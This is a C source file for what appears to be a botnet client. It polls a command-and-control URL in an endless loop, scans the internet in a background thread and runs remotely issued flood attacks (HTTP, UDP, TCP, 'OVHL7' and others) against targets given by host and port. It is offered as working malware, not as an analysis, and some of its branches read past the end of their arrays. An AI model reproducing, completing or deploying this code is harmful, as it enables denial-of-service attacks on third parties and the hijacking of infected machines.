#include "includes/px_botnet.h"

in_addr_t	addr;

void ft_manage_request(char *ptr)
{
	char **split;

	printf("test : %s\n", ptr);
	split = ft_split(ptr, '|');
	if (ft_split_len(split) >= 4)
	{
		printf("----------\n");
		printf(".%d.\n", rand() % 100);
		printf(".%s.\n", split[0]);
		printf(".%s.\n", split[1]);
		printf(".%s.\n", split[2]);
		printf(".%s.\n", split[3]);
		if (ft_split_len(split) >= 5)
			printf(".%s.\n", split[4]);
		if (ft_split_len(split) >= 6)
			printf(".%s.\n", split[5]);
		if (ft_split_len(split) >= 7)
			printf(".%s.\n", split[6]);
		printf("----------\n");
		if (!ft_strncmp(split[0], "OVHL7", 5))
			OVHL7(split[1], atoi(split[2]), atoi(split[3]), 4);
		else if (!ft_strncmp(split[0], "HTTP", 4) && ft_split_len(split) == 7) //Already forked
			HTTP(split[5], split[1], atoi(split[2]), split[4], atoi(split[3]), atoi(split[6]));
		else if (!ft_strncmp(split[0], "UDPRAW", 6))
			UDPRAW(split[1], atoi(split[2]), atoi(split[3]));
		else if (!ft_strncmp(split[0], "CNC", 3))
			CNC(split[1], atoi(split[2]), atoi(split[3]));
		else if (!ft_strncmp(split[0], "HOLD", 4))
			HOLD(split[1], atoi(split[2]), atoi(split[3]));
		else if (!ft_strncmp(split[0], "JUNK", 4))
			JUNK(split[1], atoi(split[2]), atoi(split[3]));
		else if (!ft_strncmp(split[0], "RANDHEX", 7))
			RANDHEX(split[1], atoi(split[2]), atoi(split[3]));
		else if (!ft_strncmp(split[0], "STD", 3))
			STD(split[1], atoi(split[2]), atoi(split[3]));
		else if (!ft_strncmp(split[0], "UDP", 3) && ft_split_len(split) == 6)
			UDP(split[1], atoi(split[2]), atoi(split[3]), atoi(split[4]), atoi(split[5]), atoi(split[6]));
		else if (!ft_strncmp(split[0], "TCP", 3) && ft_split_len(split) == 7)
			TCP(split[1], atoi(split[2]), atoi(split[3]), split[4], atoi(split[5]), atoi(split[6]), atoi(split[7]));
		else if (!ft_strncmp(split[0], "UNKNOWN", 7))
			UNKNOWN(split[1], atoi(split[2]), atoi(split[3]));
		else if (!ft_strncmp(split[0], "XTDCUSTOM", 9))
			XTDCUSTOM(split[1], atoi(split[2]), atoi(split[3]));
		
	}
	ft_free_split(split);
}

int main(int argc, char *argv[])
{
	pthread_t ip_searcher;
	char *id;
	char *request;
	char *tmp;

	//argv[0] = "uwu";
	addr = inet_addr("8.8.8.8");
	id = ft_get_id();
	if (pthread_create(&ip_searcher, NULL, (void *)&ft_scan_world, NULL))
		pthread_join(ip_searcher, NULL);
	while (true)
	{
		request = ft_strjoin("?id=", id);
		request = ft_strnjoinf(url_page, request, strlen(request));
		tmp = ft_request(request);
		if (tmp)
			ft_manage_request(tmp);
		free(request);
		if (DEBUG)
			usleep(250000);
		else
			sleep(rand() % 3);
	}
	return (0);
}